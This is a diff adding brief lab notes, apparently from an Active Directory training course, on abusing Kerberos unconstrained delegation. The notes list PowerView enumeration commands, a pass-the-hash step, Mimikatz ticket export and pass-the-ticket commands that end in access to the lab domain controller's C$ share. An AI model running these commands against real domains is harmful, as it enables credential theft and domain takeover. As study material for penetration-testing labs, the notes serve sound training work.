@@ -1,0 +1,23 @@
+kerberos delegation allows to "reuse the end-user credentials to access resources hosted on a different server"
+
+-Discover domain computers which have unconstrained delegation enabled using PowerView:
+
+Get-NetComputer -UnConstrained
+
+-Compromise the server(s) where Unconstrained delgation is enabled.
+
+--run as the user with admin privileges on one of the computer found in get-netcomputer -unconstrained (appsrv - PTH as appadmin)
+
+---Find-LocalAdminAccess (it'll find to appsrv which is a computer with unconstrained delegation enabled)
+
+---Enter the appsrv session (unconstrained delegation enabled computer)
+
+Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
+
+-not on appsrv
+
+Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5
+
+Invoke-Mimikatz -Command '"kerberos::ptt ticket-Administrator@krbtgt"'
+
+ls \\dcorp-dc.dollarcorp.moneycorp.local\c$ can be accessible
